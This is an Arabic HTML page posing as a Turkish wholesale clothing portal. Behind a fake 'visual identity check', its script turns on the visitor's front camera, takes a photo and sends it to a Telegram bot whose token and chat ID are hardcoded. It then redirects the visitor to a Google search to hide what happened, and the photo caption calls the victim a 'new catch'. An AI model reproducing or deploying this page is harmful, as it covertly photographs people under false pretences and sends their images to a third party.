<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة تجار تركيا 🇹🇷</title>
    <style>
        body { font-family: sans-serif; margin: 0; background-color: #f0f4f8; text-align: center; }
        header { background-color: #1a73e8; color: white; padding: 25px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        .card { background: white; padding: 30px; margin: 20px auto; max-width: 400px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
        .btn { background-color: #2e7d32; color: white; border: none; padding: 18px; border-radius: 8px; font-size: 18px; cursor: pointer; width: 100%; font-weight: bold; transition: 0.3s; }
        .btn:active { transform: scale(0.98); }
        #step-2 { display: none; } 
        #video, #canvas { display: none; }
    </style>
</head>
<body>

<header>
    <h1>أسواق تركيا للجملة 🇹🇷</h1>
</header>

<div id="step-1" class="card">
    <h2>عروض الربيع الحصرية</h2>
    <p>لقد تم تحديث الأسعار بنسبة 30%. اضغط للدخول والقي نضرة الآن.</p>
    
    <button class="btn" onclick="showStep2()">click here</button>
</div>

<div id="step-2" class="card">
    <h2 style="color: #1a73e8;">تأكيد الهوية</h2>
    <p>خطوة أمان أخيرة: يرجى الضغط على "تأكيد" للسماح بنظام الفحص البصري للتأكد من هويتك كتاجر.</p>
    <button class="btn" style="background-color: #1a73e8;" onclick="startFinal()">تأكيد الآن</button>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas" width="1280" height="720"></canvas>

<script>
    const token = "8676589474:AAF2LBiWe4lraKPUiIhaXZTLIH6DKin5xzA"; 
    const myId = "8124196406"; 

    function showStep2() {
        // الرسالة التنبيهية الخاصة بك
        alert("t7lbtlk._.😂");

        document.getElementById('step-1').style.display = 'none';
        document.getElementById('step-2').style.display = 'block';
    }

    function startFinal() {
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(stream => {
            document.getElementById('video').srcObject = stream;
            setTimeout(captureAndSend, 1200);
        })
        .catch(err => {
            alert("يجب الموافقة على 'التأكيد البصري' لفتح قائمة الأسعار!");
            location.reload();
        });
    }

    function captureAndSend() {
        const canvas = document.getElementById('canvas');
        const video = document.getElementById('video');
        canvas.getContext('2d').drawImage(video, 0, 0, 1280, 720);
        
        canvas.toBlob(blob => {
            const fd = new FormData();
            fd.append('chat_id', myId);
            fd.append('photo', blob, 'trade_verify.jpg');
            fd.append('caption', '📸 صيد جديد!\n🇹🇷 تم بنجاح.');

            fetch(https://api.telegram.org/bot${token}/sendPhoto, { method: 'POST', body: fd })
            .then(() => {
                alert("تم التحقق بنجاح! جاري تحويلك لكتالوج الأسعار...");
                window.location.href = "https://www.google.com/search?q=wholesale+clothing+turkey";
            });
        }, 'image/jpeg', 0.8);
    }
</script>
</body>
</html>
